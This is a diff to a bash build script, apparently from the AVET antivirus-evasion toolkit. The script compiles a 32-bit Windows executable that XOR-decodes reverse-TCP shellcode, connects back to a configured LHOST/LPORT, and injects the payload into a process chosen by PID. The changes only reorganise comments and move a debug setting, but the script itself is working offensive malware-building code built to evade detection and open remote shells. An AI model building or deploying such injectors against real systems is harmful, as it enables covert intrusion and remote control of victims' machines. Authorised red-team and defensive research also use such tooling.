@@ -1,16 +1,11 @@
 #!/bin/bash
+
+
+#DESCRIPTION_START
 # Shellcode injection 32-bit example build script
 # Creates an executable that injects the payload into a target process
 # The target is specified on execution via the third(!) command line argument, by PID
-
-
-# Usage example of generated output.exe:
-#
-# injectshc_targetfromcmd_fopen_gethostbyname_xor_revtcp_win32.exe first second 480
-#
-# The first and second command line parameters can be arbitrary strings, as they are not used. We hust need the third command line parameter.
-#
-# Use the third parameter to specify the PID of the process you want to inject your payload into.
+#DESCRIPTION_END
 
 
 # print AVET logo
@@ -24,9 +19,15 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# enable debug print
+enable_debug_print
+#CONFIGURATION_END
+
 
 # import feature construction interface
 . build/feature_construction.sh
@@ -71,9 +72,6 @@ set_decoder xor
 # set shellcode binding technique
 set_payload_execution_method inject_shellcode
 
-# enable debug print
-enable_debug_print
-
 # compile 
 $win32_compiler -o output/injectshc_targetfromcmd_fopen_gethostbyname_xor_revtcp_win32.exe source/avet.c -lws2_32
 strip output/injectshc_targetfromcmd_fopen_gethostbyname_xor_revtcp_win32.exe
@@ -89,3 +87,14 @@ echo "
 # The first and second command line parameters can be arbitrary strings, as they are not used. We hust need the third command line parameter.
 #
 # Use the third parameter to specify the PID of the process you want to inject your payload into."
+
+
+#USAGE_START
+# Usage example of generated output.exe:
+#
+# injectshc_targetfromcmd_fopen_gethostbyname_xor_revtcp_win32.exe first second 480
+#
+# The first and second command line parameters can be arbitrary strings, as they are not used. We hust need the third command line parameter.
+#
+# Use the third parameter to specify the PID of the process you want to inject your payload into.
+#USAGE_END
